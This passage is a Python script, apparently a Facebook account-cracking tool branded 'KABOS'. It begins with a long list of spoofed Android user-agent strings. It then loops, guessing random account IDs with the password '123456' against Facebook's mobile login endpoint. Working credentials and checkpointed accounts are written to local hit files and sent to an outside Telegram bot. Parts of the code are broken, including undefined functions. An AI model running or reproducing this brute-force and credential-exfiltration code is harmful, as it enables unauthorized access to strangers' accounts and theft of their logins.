(KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36']








us = '1234567890'
def kabos():
	global ok, cp, bad
	while True:
		ui = ''.join(random.choice(us)for i in range(10))
		email = '10000'+ui
		ps = '123456'
		pro = random.choice(ugen)
		session = requests.Session()
		free_fb = session.get('https://free.facebook.com').text
		log_data = {
                'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                'try_number': '0',
                'unrecognized_tries': '0',
                'email': email,
                'pass': ps,
                'login': 'Log In' }
		header_freefb = {
                'authority': 'free.facebook.com',
                'method': 'GET',
                'scheme': 'https',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=1',
                'cache-control': 'no-cache, no-store, must-revalidate',
                'referer': 'https://t.facebook.com/',
                'sec-ch-ua': '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': 'Windows',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?0',
                'pragma': 'no-cache',
                'priority': 'u=0',
                'cross-origin-resource-policy': 'cross-origin',
                'upgrade-insecure-requests': '1',
                'user-agent': pro }
		lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc', data=log_data, headers=header_freefb).text
		log_cookies = session.cookies.get_dict().keys()
		if 'c_user' in log_cookies:
			ok += 1
			os.system('cls' if os.name == 'nt' else 'clear')
			print (f'''
		                       𝐾𝐴𝐵𝑂𝑆
{xxh}__________________________________________

{a3}[•] 𝙶𝙾𝙾𝙳 - {ok}

{a4}[•] 𝙲𝙿 - {cp}

{a1}[•] 𝙱𝙰𝙳 - {bad}

{a34}- 𝙰𝙲𝙲𝙾𝚄𝙽𝚃 : {email} | {ps}

{xxh}__________________________________________
		''')
			tlgok = f''' 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 🛸

|￣￣￣￣￣￣￣￣￣￣￣￣￣￣|
                                        حساب شغال ⚡
|＿＿＿＿＿＿＿＿＿＿＿＿＿＿|
                     \ (•◡•) /
                       \       /
┏━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┓
❍                     ⚜️ 𝐾𝐴𝐵𝑂𝑆 ⚜️         ❍   
┗━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┛

🛸 - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 :  {email}

🛸 - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {ps}

▄︻デ══━一💨  ⛧°｡⋆OK⋆｡°⛧ 

┏━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┓
❍ @K_A_B_OS ⚜️ 𝐾𝐴𝐵𝑂𝑆 ⚜️ @K_A_B_OS ❍  
┗━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┛

 '''
			requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=" + str(tlgok))
			with open('Facebook Hits.txt', 'a') as x:
				x.write(email + ":" + ps + '\n' + tlgok)
		
# KABOS

		elif 'checkpoint' in log_cookies:
			cp += 1
			os.system('cls' if os.name == 'nt' else 'clear')
			print (f'''
		                       𝐾𝐴𝐵𝑂𝑆
{xxh}__________________________________________

{a3}[•] 𝙶𝙾𝙾𝙳 - {ok}

{a4}[•] 𝙲𝙿 - {cp}

{a1}[•] 𝙱𝙰𝙳 - {bad}

{a34}- 𝙰𝙲𝙲𝙾𝚄𝙽𝚃 : {email} | {ps}

{xxh}__________________________________________
		''')
			requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=" + str(f'سكيور من عمك : {email} | {ps}'))
			with open('Facebook Cp.txt', 'a') as x:
				x.write(email + ":" + ps + '\n')
		
# KABOS

		elif 'Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun' in log_cookies or 'The phone number or email you entered does not match any account' in log_cookies or 'الرقم الهاتفي أو البريد الإلكتروني الذي أدخلته لا يتطابق مع أي حساب' in log_cookies or 'Incorrect Email or password' in log_cookies or 'Incorrect Email' in log_cookies or 'Incorrect password' in log_cookies or 'Not Found Your Account' in log_cookies:
			bad +=1
			os.system('cls' if os.name == 'nt' else 'clear')
			print (f'''
		                       𝐾𝐴𝐵𝑂𝑆
{xxh}__________________________________________

{a3}[•] 𝙶𝙾𝙾𝙳 - {ok}

{a4}[•] 𝙲𝙿 - {cp}

{a1}[•] 𝙱𝙰𝙳 - {bad}

{a34}- 𝙰𝙲𝙲𝙾𝚄𝙽𝚃 : {email} | {ps}

{xxh}__________________________________________
		''')



		else:
			bad +=1
			os.system('cls' if os.name == 'nt' else 'clear')
			print (f'''
		                       𝐾𝐴𝐵𝑂𝑆
{xxh}__________________________________________

{a3}[•] 𝙶𝙾𝙾𝙳 - {ok}

{a4}[•] 𝙲𝙿 - {cp}

{a1}[•] 𝙱𝙰𝙳 - {bad}

{a34}- 𝙰𝙲𝙲𝙾𝚄𝙽𝚃 : {email} | {ps}

{xxh}__________________________________________
		''')

	import threading
	Threads=[] 
	for t in range(5):
		x = threading.Thread(target=users)
		x.start()
		Threads.append(x)
	for Th in Threads:
	 Th.join()
	target = kabos
	rrange(2000000)


# KABOS	
#_________عمك كابوس
# KABOS
kabos()


target = kabos
rrange(2000000)

